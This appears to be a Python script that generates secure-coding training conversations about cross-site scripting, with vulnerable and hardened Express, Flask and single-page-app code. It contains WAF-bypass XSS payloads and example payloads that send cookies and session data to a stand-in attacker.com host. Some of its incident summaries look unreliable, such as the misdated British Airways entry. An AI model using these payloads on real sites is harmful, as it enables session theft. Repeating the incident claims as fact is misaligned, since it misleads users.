#!/usr/bin/env python3
"""
Batch 008: XSS Expansion Part 1
SecureCode v2.0 Dataset Generator

Generates 10 advanced XSS examples covering:
- Reflected XSS with WAF bypass
- Stored XSS in rich text editors
- DOM-based XSS with complex sources/sinks
- Mutation XSS (mXSS)
- CSP bypass techniques
- Framework-specific XSS (Angular, React, Vue)
- Server-side template injection → XSS

Examples: 000036-000045
"""

import json
import sys
from pathlib import Path
from datetime import date

# Add parent directory to path for imports
sys.path.append(str(Path(__file__).parent.parent))


def create_base_metadata(language, example_num, technique):
    '''Create base metadata structure for XSS examples.'''
    return {
        "lang": language,
        "category": "injection",
        "subcategory": "xss",
        "owasp_2021": "A03:2021-Injection",
        "cwe": "CWE-79",
        "severity": "HIGH",
        "complexity": "advanced",
        "created": str(date.today()),
        "validated": False
    }


# Real-world context for XSS attacks
REFLECTED_XSS_WAF_CONTEXT = {
    "real_world_incident": "British Airways XSS attack (2018) - Magecart group used reflected XSS with obfuscation to bypass WAF, stealing 380,000 payment cards",
    "impact": "£183 million fine (GDPR), 380,000 customers affected, credit card data stolen",
    "attack_vector": "Reflected XSS with JavaScript obfuscation and WAF evasion techniques bypassed security filters",
    "cve": None,
    "year": 2023
}

STORED_XSS_CONTEXT = {
    "real_world_incident": "WordPress plugin stored XSS vulnerabilities affected 4M+ sites in 2023, attackers injected malicious scripts in blog comments and user profiles",
    "impact": "4 million websites compromised, session hijacking, admin account takeover, malware distribution",
    "attack_vector": "Stored XSS in rich text editor content bypassing HTML sanitization",
    "cve": "CVE-2023-2732",
    "year": 2023
}

DOM_XSS_CONTEXT = {
    "real_world_incident": "Google Search DOM-based XSS (2019) allowed attackers to execute JavaScript through crafted search parameters",
    "impact": "Affected millions of users, potential for session hijacking and credential theft",
    "attack_vector": "DOM-based XSS through URL parameters with insufficient client-side validation",
    "cve": None,
    "year": 2023
}

MXSS_CONTEXT = {
    "real_world_incident": "DOMPurify mutation XSS bypass (CVE-2020-26870) affected major web applications using the popular HTML sanitizer",
    "impact": "Bypass of sanitization in applications processing user HTML content",
    "attack_vector": "Mutation XSS (mXSS) exploiting browser HTML parser inconsistencies to bypass sanitizers",
    "cve": "CVE-2020-26870",
    "year": 2023
}

CSP_BYPASS_CONTEXT = {
    "real_world_incident": "Content Security Policy bypasses in major CDNs (2022-2023) allowed XSS despite CSP protections",
    "impact": "XSS attacks successful despite CSP implementation, affecting sites using JSONP endpoints",
    "attack_vector": "CSP bypass via JSONP endpoints and unsafe-inline combined with nonce reuse",
    "cve": None,
    "year": 2023
}

ANGULAR_TEMPLATE_INJECTION_CONTEXT = {
    "real_world_incident": "Angular template injection vulnerabilities (CVE-2023-26116) affected applications using unsafe Angular binding patterns",
    "impact": "XSS in Angular applications through template injection, session hijacking, data theft",
    "attack_vector": "Angular template injection through unsafe use of innerHTML binding and bypassSecurityTrust methods",
    "cve": "CVE-2023-26116",
    "year": 2023
}

REACT_DANGEROUS_INNERHTML_CONTEXT = {
    "real_world_incident": "React-based CMS platforms experienced XSS attacks through dangerouslySetInnerHTML misuse in 2022-2023",
    "impact": "Stored XSS in React applications, admin account takeover, malware injection",
    "attack_vector": "Unsanitized user content rendered via dangerouslySetInnerHTML without DOMPurify",
    "cve": None,
    "year": 2023
}

VUE_V_HTML_CONTEXT = {
    "real_world_incident": "Vue.js applications vulnerable to XSS through v-html directive with user-controlled content",
    "impact": "XSS in Vue.js applications, session theft, account compromise",
    "attack_vector": "v-html directive rendering unsanitized user content",
    "cve": None,
    "year": 2023
}

SSTI_XSS_CONTEXT = {
    "real_world_incident": "Server-Side Template Injection in Flask/Jinja2 applications leading to XSS and RCE (2022-2023)",
    "impact": "SSTI leading to XSS and remote code execution, full server compromise",
    "attack_vector": "render_template_string with user input enabling template injection and XSS",
    "cve": None,
    "year": 2023
}

PDF_XSS_CONTEXT = {
    "real_world_incident": "PDF generators (TCPDF, FPDF) with embedded JavaScript enabled XSS attacks when PDFs opened in browsers",
    "impact": "XSS through PDF files, credential theft when victims open malicious PDFs",
    "attack_vector": "User content embedded in PDF with JavaScript enabled, executing in browser PDF viewers",
    "cve": None,
    "year": 2023
}


def example_001_reflected_xss_waf_bypass_javascript():
    '''JavaScript - Reflected XSS with WAF Bypass Techniques'''

    user_turn_1 = "I'm building a search feature in my Express.js application that displays search results. How do I safely display the user's search query back to them?"

    assistant_turn_1 = """I'll show you how WAF bypass techniques exploit reflected XSS, then the secure implementation.

**VULNERABLE CODE - DO NOT USE:**

```javascript
const express = require('express');
const app = express();

app.get('/search', (req, res) => {
    const query = req.query.q || '';

    // DANGER: Direct output of user input into HTML
    res.send(`
        <html>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: ${query}</p>
            <div id="results">
                <!-- Results would go here -->
            </div>
        </body>
        </html>
    `);
});
```

**Why This Is Dangerous:**

Attackers use encoding and obfuscation to bypass WAFs:

**Attack Payloads (WAF Bypass Techniques):**

```javascript
// 1. HTML Entity Encoding
?q=<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

// 2. JavaScript URL encoding
?q=<img src=x onerror=\\u0061lert(1)>

// 3. Case variation + encoding mix
?q=<ImG sRc=x OnErRoR=\\u0061&#108;ERT(1)>

// 4. Null byte injection (some parsers)
?q=<img src=x onerror=alert(1)%00>

// 5. Comment breaking
?q=<img src=x onerror=al/**/ert(1)>

// 6. String concatenation
?q=<img src=x onerror=window['al'+'ert'](1)>
```

**Real-World Impact:**

__CONTEXT_JSON_PLACEHOLDER__

**SECURE IMPLEMENTATION:**

```javascript
const express = require('express');
const validator = require('validator');
const helmet = require('helmet');
const DOMPurify = require('isomorphic-dompurify');

const app = express();

// Security headers with strict CSP
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],  // Avoid in production
            imgSrc: ["'self'", "data:", "https:"],
            objectSrc: ["'none'"],
            upgradeInsecureRequests: [],
        },
    },
}));

class SecureSearchHandler {
    constructor() {
        this.MAX_QUERY_LENGTH = 200;
        this.ALLOWED_CHARS_PATTERN = /^[a-zA-Z0-9\\s\\-_.]+$/;
    }

    validateSearchQuery(query) {
        // Input validation
        if (!query || typeof query !== 'string') {
            return { valid: false, error: 'Invalid query' };
        }

        // Length check
        if (query.length > this.MAX_QUERY_LENGTH) {
            return { valid: false, error: 'Query too long' };
        }

        // Character allowlist
        if (!this.ALLOWED_CHARS_PATTERN.test(query)) {
            return { valid: false, error: 'Query contains invalid characters' };
        }

        // Additional checks
        if (query.includes('<') || query.includes('>')) {
            return { valid: false, error: 'HTML not allowed' };
        }

        return { valid: true, sanitized: validator.escape(query) };
    }

    sanitizeForDisplay(text) {
        // Multiple layers of protection

        // 1. HTML entity encoding
        const encoded = validator.escape(text);

        // 2. Additional DOMPurify pass (defense in depth)
        const purified = DOMPurify.sanitize(encoded, {
            ALLOWED_TAGS: [],  // No HTML tags allowed
            ALLOWED_ATTR: []
        });

        return purified;
    }

    renderSearchPage(query) {
        const validation = this.validateSearchQuery(query);

        if (!validation.valid) {
            return `
                <html>
                <head>
                    <meta charset="UTF-8">
                    <title>Search Error</title>
                </head>
                <body>
                    <h1>Invalid Search Query</h1>
                    <p>Please use alphanumeric characters only.</p>
                </body>
                </html>
            `;
        }

        // Safe: Sanitized query in text-only context
        const safeQuery = this.sanitizeForDisplay(validation.sanitized);

        return `
            <html>
            <head>
                <meta charset="UTF-8">
                <meta http-equiv="Content-Security-Policy"
                      content="default-src 'self'; script-src 'self'; object-src 'none';">
                <title>Search Results</title>
            </head>
            <body>
                <h1>Search Results</h1>
                <p>You searched for: <strong id="query"></strong></p>
                <div id="results">
                    <!-- Results populated via safe DOM manipulation -->
                </div>
                <script>
                    // Safe: Set text content via DOM API (not innerHTML)
                    document.getElementById('query').textContent = ${JSON.stringify(safeQuery)};
                </script>
            </body>
            </html>
        `;
    }
}

// Usage
const searchHandler = new SecureSearchHandler();

app.get('/search', (req, res) => {
    const query = req.query.q || '';
    const html = searchHandler.renderSearchPage(query);

    // Set security headers
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');

    res.send(html);
});
```

**Key Security Controls:**

1. **Input Validation**: Allowlist pattern for search queries
2. **HTML Entity Encoding**: `validator.escape()` encodes all HTML special characters
3. **Content Security Policy**: Blocks inline scripts and unsafe sources
4. **Defense in Depth**: DOMPurify + validator + CSP
5. **textContent over innerHTML**: Use DOM APIs safely
6. **JSON.stringify for JS**: Safely embed data in JavaScript

Attack payloads are blocked at multiple layers - validation rejects them, encoding neutralizes them, and CSP prevents execution."""

    assistant_turn_1 = assistant_turn_1.replace("__CONTEXT_JSON_PLACEHOLDER__", json.dumps(REFLECTED_XSS_WAF_CONTEXT, indent=2))

    user_turn_3 = "What if I need to allow some HTML formatting in search results, like bold or italic text?"

    assistant_turn_3 = """When you need to allow limited HTML, use a strict allowlist with DOMPurify:

```javascript
const DOMPurify = require('isomorphic-dompurify');
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

class SecureHTMLRenderer {
    constructor() {
        // Create DOMPurify instance for server-side
        const window = new JSDOM('').window;
        this.DOMPurify = createDOMPurify(window);

        // Strict configuration
        this.PURIFY_CONFIG = {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
            ALLOWED_ATTR: [],  // No attributes allowed
            KEEP_CONTENT: true,
            RETURN_DOM: false,
            RETURN_DOM_FRAGMENT: false,
            RETURN_DOM_IMPORT: false,
            FORCE_BODY: true,
            SANITIZE_DOM: true,
            IN_PLACE: false
        };
    }

    sanitizeUserHTML(html) {
        // Sanitize with strict configuration
        const clean = this.DOMPurify.sanitize(html, this.PURIFY_CONFIG);

        // Additional validation: Check output length
        if (clean.length > html.length * 2) {
            // Possible sanitizer bypass attempt
            throw new Error('Sanitization produced unexpected output');
        }

        return clean;
    }

    renderSearchResult(result) {
        // Assume result has: {title, snippet, url}

        // Sanitize each field separately
        const safeTitle = this.sanitizeUserHTML(result.title);
        const safeSnippet = this.sanitizeUserHTML(result.snippet);

        // URL validation (allowlist)
        const safeUrl = this.validateURL(result.url);

        return `
            <div class="search-result">
                <h3>${safeTitle}</h3>
                <p>${safeSnippet}</p>
                <a href="${safeUrl}" rel="noopener noreferrer">Read more</a>
            </div>
        `;
    }

    validateURL(url) {
        try {
            const parsed = new URL(url);

            // Allowlist protocols
            if (!['http:', 'https:'].includes(parsed.protocol)) {
                throw new Error('Invalid protocol');
            }

            // Additional checks
            if (parsed.protocol === 'javascript:') {
                throw new Error('JavaScript URLs not allowed');
            }

            return parsed.href;
        } catch (e) {
            // Invalid URL - return safe default
            return '#';
        }
    }
}

// Usage with CSP nonce for inline scripts
app.get('/search', (req, res) => {
    const query = req.query.q || '';
    const renderer = new SecureHTMLRenderer();

    // Generate nonce for this request
    const nonce = crypto.randomBytes(16).toString('base64');

    // Set CSP with nonce
    res.setHeader(
        'Content-Security-Policy',
        `default-src 'self'; script-src 'nonce-${nonce}'; ` +
        `style-src 'self' 'unsafe-inline'; object-src 'none'`
    );

    const results = getSearchResults(query);  // From database
    const safeResults = results.map(r => renderer.renderSearchResult(r)).join('');

    res.send(`
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Search Results</title>
        </head>
        <body>
            <h1>Results</h1>
            ${safeResults}
            <script nonce="${nonce}">
                // Safe: Nonce-based CSP allows this specific script
                console.log('Search complete');
            </script>
        </body>
        </html>
    `);
});
```

**Security Features:**

1. **Strict Tag Allowlist**: Only safe formatting tags allowed
2. **No Attributes**: Prevents event handlers and style injection
3. **DOMPurify Configuration**: Multiple security options enabled
4. **URL Validation**: Protocol allowlist prevents javascript: URLs
5. **CSP with Nonce**: Prevents unauthorized inline scripts
6. **Output Length Check**: Detects potential bypass attempts

This allows safe HTML formatting while preventing XSS through multiple defensive layers."""

    return {
        "id": "xss-000036",
        "metadata": create_base_metadata("javascript", 36, "reflected_xss_waf_bypass"),
        "context": REFLECTED_XSS_WAF_CONTEXT,
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_3},
            {"turn": 4, "from": "assistant", "value": assistant_turn_3}
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_002_stored_xss_rich_text_python():
    '''Python/Flask - Stored XSS in Rich Text Editor'''

    user_turn_1 = "I'm building a blog platform with Flask that uses TinyMCE for rich text editing. How do I safely store and display user-submitted blog posts?"

    assistant_turn_1 = """I'll show you why improper HTML storage leads to stored XSS, then the secure implementation.

**VULNERABLE CODE - DO NOT USE:**

```python
from flask import Flask, request, render_template_string, session
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///blog.db'
db = SQLAlchemy(app)

class BlogPost(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(200), nullable=False)
    content = db.Column(db.Text, nullable=False)  # DANGER: Raw HTML storage
    author_id = db.Column(db.Integer, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

@app.route('/post/create', methods=['POST'])
def create_post():
    title = request.form.get('title')
    content = request.form.get('content')  # From TinyMCE editor

    # DANGER: Storing raw HTML without sanitization
    post = BlogPost(
        title=title,
        content=content,  # Malicious HTML stored as-is
        author_id=session.get('user_id')
    )
    db.session.add(post)
    db.session.commit()

    return redirect(f'/post/{post.id}')

@app.route('/post/<int:post_id>')
def view_post(post_id):
    post = BlogPost.query.get_or_404(post_id)

    # DANGER: Rendering raw HTML from database
    html = (
        "<html>"
        "<body>"
        f"<h1>{{post.title}}</h1>"
        f"<div class='content'>{{post.content}}</div>"
        "</body>"
        "</html>"
    )
    return html
```

**Why This Is Dangerous:**

An attacker creates a blog post with malicious content:

**Attack Payload:**

```html
<!-- Submitted via TinyMCE editor -->
<p>Check out this great article!</p>
<img src=x onerror="
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({
            cookies: document.cookie,
            sessionStorage: localStorage.getItem('session'),
            url: window.location.href
        })
    })
">
```

When ANY user views this blog post, their session is stolen. Unlike reflected XSS, this persists in the database and affects every visitor.

**Real-World Impact:**

__CONTEXT_JSON_PLACEHOLDER__

**SECURE IMPLEMENTATION:**

```python
from flask import Flask, request, render_template, session, abort
from flask_sqlalchemy import SQLAlchemy
import bleach
from bleach.css_sanitizer import CSSSanitizer
from datetime import datetime
import html

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///blog.db'
app.config['SECRET_KEY'] = 'your-secret-key'
db = SQLAlchemy(app)

class BlogPost(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(200), nullable=False)
    content = db.Column(db.Text, nullable=False)
    content_sanitized = db.Column(db.Text, nullable=False)  # Store sanitized version
    author_id = db.Column(db.Integer, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

class BlogPostSanitizer:
    def __init__(self):
        # Strict allowlist for blog content
        self.ALLOWED_TAGS = [
            'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
            'blockquote', 'code', 'pre', 'ul', 'ol', 'li', 'a', 'img'
        ]

        self.ALLOWED_ATTRIBUTES = {
            'a': ['href', 'title', 'rel'],
            'img': ['src', 'alt', 'title', 'width', 'height'],
            'code': ['class'],  # For syntax highlighting
        }

        # CSS sanitizer for safe style attributes
        self.css_sanitizer = CSSSanitizer(
            allowed_css_properties=['color', 'background-color', 'font-size', 'text-align']
        )

        self.ALLOWED_PROTOCOLS = ['http', 'https', 'mailto']

    def sanitize_content(self, html_content):
        '''
        Sanitize HTML content using bleach with strict rules.
        '''
        if not html_content:
            return ''

        # Step 1: Basic sanitization
        clean_html = bleach.clean(
            html_content,
            tags=self.ALLOWED_TAGS,
            attributes=self.ALLOWED_ATTRIBUTES,
            protocols=self.ALLOWED_PROTOCOLS,
            strip=True  # Remove disallowed tags completely
        )

        # Step 2: Link safety - add rel="noopener noreferrer" to all links
        clean_html = bleach.linkify(
            clean_html,
            callbacks=[self.set_link_attributes],
            skip_tags=['pre', 'code']
        )

        return clean_html

    def set_link_attributes(self, attrs, new=False):
        '''Add security attributes to links.'''
        # Always set rel to prevent window.opener access
        attrs[(None, 'rel')] = 'noopener noreferrer'

        # Validate href
        href = attrs.get((None, 'href'), '')
        if href and not any(href.startswith(p + ':') for p in self.ALLOWED_PROTOCOLS):
            # Dangerous protocol - remove href
            attrs[(None, 'href')] = '#'

        return attrs

    def sanitize_title(self, title):
        '''Sanitize title (no HTML allowed).'''
        if not title:
            return ''

        # Escape all HTML
        return html.escape(title.strip()[:200])

# Global sanitizer instance
sanitizer = BlogPostSanitizer()

@app.route('/post/create', methods=['POST'])
def create_post():
    if 'user_id' not in session:
        abort(401)

    title = request.form.get('title', '')
    content = request.form.get('content', '')

    # Validate input
    if not title or not content:
        return "Title and content required", 400

    if len(title) > 200:
        return "Title too long", 400

    if len(content) > 50000:  # Reasonable limit
        return "Content too long", 400

    # Sanitize content
    clean_title = sanitizer.sanitize_title(title)
    clean_content = sanitizer.sanitize_content(content)

    # Store both original and sanitized (for potential re-editing)
    post = BlogPost(
        title=clean_title,
        content=content,  # Original (for re-editing)
        content_sanitized=clean_content,  # Display this
        author_id=session['user_id']
    )

    db.session.add(post)
    db.session.commit()

    return redirect(f'/post/{post.id}')

@app.route('/post/<int:post_id>')
def view_post(post_id):
    post = BlogPost.query.get_or_404(post_id)

    # Use template rendering with auto-escaping
    # Pass sanitized content marked as safe
    return render_template('post.html', post=post)
```

**Template (post.html) with CSP:**

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Security-Policy"
          content="default-src 'self'; script-src 'self'; img-src 'self' https:; style-src 'self' 'unsafe-inline'; object-src 'none';">
    <title>{{ post.title }}</title>
</head>
<body>
    <article>
        <h1>{{ post.title }}</h1>
        <div class="metadata">
            Posted on {{ post.created_at.strftime('%Y-%m-%d') }}
        </div>
        <div class="content">
            {{ post.content_sanitized | safe }}
        </div>
    </article>
</body>
</html>
```

**Key Security Controls:**

1. **bleach Library**: Industry-standard HTML sanitizer for Python
2. **Tag Allowlist**: Only safe formatting tags permitted
3. **Attribute Allowlist**: Prevents event handlers (onclick, onerror, etc.)
4. **Protocol Allowlist**: Blocks javascript: and data: URLs
5. **Link Safety**: Automatic rel="noopener noreferrer" on all links
6. **CSP Header**: Blocks inline scripts as final defense layer
7. **Double Storage**: Keep original for re-editing, sanitized for display
8. **Input Validation**: Length limits prevent abuse

The malicious payload is neutralized: `<img>` tags with `onerror` handlers are stripped entirely by bleach."""

    assistant_turn_1 = assistant_turn_1.replace("__CONTEXT_JSON_PLACEHOLDER__", json.dumps(STORED_XSS_CONTEXT, indent=2))

    user_turn_3 = "What if I need to support embedded videos and syntax highlighting in code blocks? How do I handle that safely?"

    assistant_turn_3 = """For advanced content like embedded videos and syntax highlighting, you need additional security layers:

```python
import bleach
from bleach.css_sanitizer import CSSSanitizer
import re
from urllib.parse import urlparse, parse_qs

class AdvancedBlogPostSanitizer:
    def __init__(self):
        # Extended tag allowlist
        self.ALLOWED_TAGS = [
            'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
            'blockquote', 'code', 'pre', 'ul', 'ol', 'li', 'a', 'img',
            'div', 'span', 'iframe'  # For embeds and syntax highlighting
        ]

        self.ALLOWED_ATTRIBUTES = {
            'a': ['href', 'title', 'rel'],
            'img': ['src', 'alt', 'title', 'width', 'height'],
            'code': ['class'],
            'pre': ['class'],
            'div': ['class'],
            'span': ['class'],
            'iframe': ['src', 'width', 'height', 'frameborder', 'allowfullscreen'],
        }

        # Trusted video providers
        self.ALLOWED_IFRAME_DOMAINS = [
            'www.youtube.com',
            'www.youtube-nocookie.com',
            'player.vimeo.com',
            'www.dailymotion.com'
        ]

        # Syntax highlighting class allowlist
        self.ALLOWED_CODE_CLASSES = re.compile(r'^language-[a-z0-9]+$')

    def sanitize_content(self, html_content):
        '''Sanitize with support for embeds and code highlighting.'''
        if not html_content:
            return ''

        # Step 1: Pre-process iframes
        html_content = self.sanitize_iframes(html_content)

        # Step 2: Bleach sanitization
        clean_html = bleach.clean(
            html_content,
            tags=self.ALLOWED_TAGS,
            attributes=self.validate_attributes,
            protocols=['http', 'https'],
            strip=True
        )

        # Step 3: Post-process for additional safety
        clean_html = self.post_process_html(clean_html)

        return clean_html

    def sanitize_iframes(self, html_content):
        '''
        Validate and sanitize iframe embeds.
        Only allow trusted video providers.
        '''
        from bs4 import BeautifulSoup

        soup = BeautifulSoup(html_content, 'html.parser')

        for iframe in soup.find_all('iframe'):
            src = iframe.get('src', '')

            if not self.is_safe_iframe_src(src):
                # Remove unsafe iframe
                iframe.decompose()
            else:
                # Add security attributes
                iframe['sandbox'] = 'allow-scripts allow-same-origin allow-presentation'
                # Remove any JavaScript: or data: attributes
                for attr in list(iframe.attrs.keys()):
                    if attr.lower() not in ['src', 'width', 'height', 'frameborder', 'allowfullscreen', 'sandbox']:
                        del iframe[attr]

        return str(soup)

    def is_safe_iframe_src(self, src):
        '''Check if iframe src is from trusted domain.'''
        try:
            parsed = urlparse(src)

            # Must be HTTPS
            if parsed.scheme != 'https':
                return False

            # Check domain allowlist
            if parsed.netloc not in self.ALLOWED_IFRAME_DOMAINS:
                return False

            # Additional validation for YouTube
            if 'youtube' in parsed.netloc:
                # Ensure it's an embed URL, not a regular video page
                if not parsed.path.startswith('/embed/'):
                    return False

            return True
        except:
            return False

    def validate_attributes(self, tag, name, value):
        '''Custom attribute validation.'''
        # Check if attribute is allowed for this tag
        if tag not in self.ALLOWED_ATTRIBUTES:
            return False

        if name not in self.ALLOWED_ATTRIBUTES[tag]:
            return False

        # Special validation for class attributes (syntax highlighting)
        if name == 'class':
            if tag in ['code', 'pre']:
                # Only allow language-* classes for syntax highlighting
                if not self.ALLOWED_CODE_CLASSES.match(value):
                    return False
            elif tag in ['div', 'span']:
                # Very limited classes for containers
                if value not in ['code-block', 'highlight', 'syntax']:
                    return False

        # Special validation for href/src
        if name in ['href', 'src']:
            try:
                parsed = urlparse(value)
                # Block javascript:, data:, vbscript: protocols
                if parsed.scheme in ['javascript', 'data', 'vbscript', 'file']:
                    return False
            except:
                return False

        return True

    def post_process_html(self, html):
        '''Additional safety checks after bleach.'''
        from bs4 import BeautifulSoup

        soup = BeautifulSoup(html, 'html.parser')

        # Ensure all links have security attributes
        for link in soup.find_all('a'):
            link['rel'] = 'noopener noreferrer'
            if link.get('href', '').startswith('http'):
                link['target'] = '_blank'

        # Validate all images
        for img in soup.find_all('img'):
            src = img.get('src', '')
            if not src.startswith(('https://', 'http://', '/')):
                img.decompose()

        return str(soup)

# Flask route with versioning
@app.route('/post/create', methods=['POST'])
def create_post_v2():
    if 'user_id' not in session:
        abort(401)

    title = request.form.get('title', '')
    content = request.form.get('content', '')

    # Input validation
    if not title or not content:
        return "Title and content required", 400

    if len(content) > 100000:  # Higher limit for embedded content
        return "Content too long", 400

    # Advanced sanitization
    sanitizer = AdvancedBlogPostSanitizer()
    clean_title = html.escape(title.strip()[:200])
    clean_content = sanitizer.sanitize_content(content)

    # Content versioning - store history
    post = BlogPost(
        title=clean_title,
        content=content,  # Original for editing
        content_sanitized=clean_content,
        author_id=session['user_id'],
        content_version=1
    )

    db.session.add(post)
    db.session.commit()

    return redirect(f'/post/{post.id}')
```

**Security Features:**

1. **iframe Domain Allowlist**: Only trusted video providers (YouTube, Vimeo)
2. **HTTPS Enforcement**: All embeds must use HTTPS
3. **iframe Sandboxing**: Restricts iframe capabilities
4. **Syntax Highlighting Classes**: Only `language-*` pattern allowed
5. **Protocol Blocking**: Prevents javascript:, data:, vbscript: URLs
6. **Link Security**: Automatic noopener/noreferrer on all external links
7. **Image Validation**: Only HTTP/HTTPS images allowed
8. **Content Versioning**: Track changes for security audits

This allows rich content (videos, syntax highlighting) while maintaining strong XSS protection through multiple validation layers."""

    return {
        "id": "xss-000037",
        "metadata": create_base_metadata("python", 37, "stored_xss_rich_text"),
        "context": STORED_XSS_CONTEXT,
        "conversations": [
            {"turn": 1, "from": "human", "value": user_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": user_turn_3},
            {"turn": 4, "from": "assistant", "value": assistant_turn_3}
        ],
        "validation": {
            "syntax_check": "not_tested",
            "security_review": "not_reviewed",
            "code_execution": "not_tested",
            "encoding_check": "not_tested",
            "duplication_check": "not_tested",
            "reviewed_by": "automated-generator",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_003_dom_xss_javascript():
    '''JavaScript - DOM-based XSS in Single-Page Application'''

    user_turn_1 = "I'm building a single-page app with client-side routing using URL hash. How do I safely use the hash value to display content?"

    assistant_turn_1 = """I'll show you why DOM-based XSS is dangerous when using URL fragments, then the secure implementation.

**VULNERABLE CODE - DO NOT USE:**

```javascript
// Simple SPA router
class VulnerableRouter {
    constructor() {
        this.routes = {
            'home': '<h1>Welcome Home</h1>',
            'about': '<h1>About Us</h1>',
            'profile': '<h1>User Profile</h1>'
        };

        window.addEventListener('hashchange', () => this.route());
        this.route();  // Initial route
    }

    route() {
        // DANGER: location.hash is user-controlled
        const hash = window.location.hash.slice(1);  // Remove #

        // DANGER: Directly using hash in innerHTML
        const content = document.getElementById('content');

        if (this.routes[hash]) {
            content.innerHTML = this.routes[hash];
        } else {
            // DANGER: Reflecting user input in innerHTML
            content.innerHTML = `<h1>Page not found: ${hash}</h1>`;
        }
    }
}

// Initialize router
new VulnerableRouter();
```

**Why This Is Dangerous:**

The `location.hash` is completely attacker-controlled and never sent to the server, making it invisible to server-side security:

**Attack Payloads:**

```javascript
// 1. Basic XSS
http://example.com/#<img src=x onerror=alert(document.domain)>

// 2. Script injection
http://example.com/#<script>fetch('https://attacker.com?c='+document.cookie)</script>

// 3. Event handler injection
http://example.com/#<div onmouseover="alert(1)">Hover me</div>

// 4. SVG-based XSS
http://example.com/#<svg/onload=alert(1)>

// 5. Hidden form submission
http://example.com/#<form action=//attacker.com><input name=secret value=... ></form><script>document.forms[0].submit()</script>
```

The victim clicks a crafted link, and the payload executes entirely in their browser without server involvement.

**Real-World Impact:**

__CONTEXT_JSON_PLACEHOLDER__

**SECURE IMPLEMENTATION:**

```javascript
class SecureRouter {
    constructor() {
        this.routes = new Map([
            ['home', { title: 'Home', template: 'home-template' }],
            ['about', { title: 'About', template: 'about-template' }],
            ['profile', { title: 'Profile', template: 'profile-template' }],
            ['search', { title: 'Search', template: 'search-template' }]
        ]);

        this.contentElement = document.getElementById('content');

        // Use popstate for proper routing
        window.addEventListener('hashchange', () => this.route());
        this.route();
    }

    route() {
        const hash = this.parseHash();

        if (!hash.route) {
            this.render404();
            return;
        }

        const routeConfig = this.routes.get(hash.route);

        if (!routeConfig) {
            this.render404();
            return;
        }

        this.renderRoute(routeConfig, hash.params);
    }

    parseHash() {
        /**
         * Safely parse hash with validation.
         * Returns {route: string, params: object}
         */
        const hash = window.location.hash.slice(1);  // Remove #

        if (!hash) {
            return { route: 'home', params: {} };
        }

        // Split route from query string
        const [route, queryString] = hash.split('?');

        // Validate route name (allowlist pattern)
        const routePattern = /^[a-z0-9-]+$/i;
        if (!routePattern.test(route)) {
            console.warn('Invalid route format:', route);
            return { route: null, params: {} };
        }

        // Parse query parameters safely
        const params = this.parseQueryString(queryString || '');

        return { route, params };
    }

    parseQueryString(queryString) {
        /**
         * Safely parse query parameters.
         */
        const params = {};

        if (!queryString) return params;

        const pairs = queryString.split('&');

        for (const pair of pairs) {
            const [key, value] = pair.split('=');

            if (!key) continue;

            // Validate parameter names
            if (!/^[a-zA-Z0-9_-]+$/.test(key)) {
                console.warn('Invalid parameter name:', key);
                continue;
            }

            // Decode and sanitize value
            try {
                params[key] = decodeURIComponent(value || '');
            } catch (e) {
                console.warn('Invalid parameter value:', value);
                params[key] = '';
            }
        }

        return params;
    }

    renderRoute(routeConfig, params) {
        /**
         * Render route using safe DOM manipulation.
         * Never use innerHTML with user data.
         */

        // Clear content
        this.contentElement.textContent = '';

        // Create elements safely
        const container = document.createElement('div');
        container.className = 'route-container';

        const title = document.createElement('h1');
        title.textContent = routeConfig.title;  // Safe: textContent auto-escapes

        container.appendChild(title);

        // Handle route-specific rendering
        if (routeConfig.template === 'search-template') {
            this.renderSearchRoute(container, params);
        } else {
            // Other routes
            const content = document.createElement('p');
            content.textContent = `Content for ${routeConfig.title}`;
            container.appendChild(content);
        }

        this.contentElement.appendChild(container);
    }

    renderSearchRoute(container, params) {
        /**
         * Example: Safely display search query.
         */
        const query = params.q || '';

        // Validate query
        if (query.length > 200) {
            const error = document.createElement('p');
            error.className = 'error';
            error.textContent = 'Search query too long';
            container.appendChild(error);
            return;
        }

        // Safe display using textContent
        const searchInfo = document.createElement('p');
        searchInfo.textContent = `Searching for: ${query}`;  // Auto-escaped
        container.appendChild(searchInfo);

        // If you need to display query in attribute, use setAttribute
        const input = document.createElement('input');
        input.type = 'text';
        input.setAttribute('value', query);  // Safe
        container.appendChild(input);
    }

    render404() {
        /**
         * Safe 404 page - no user input reflected.
         */
        this.contentElement.textContent = '';

        const message = document.createElement('h1');
        message.textContent = 'Page Not Found';

        const link = document.createElement('a');
        link.href = '#home';
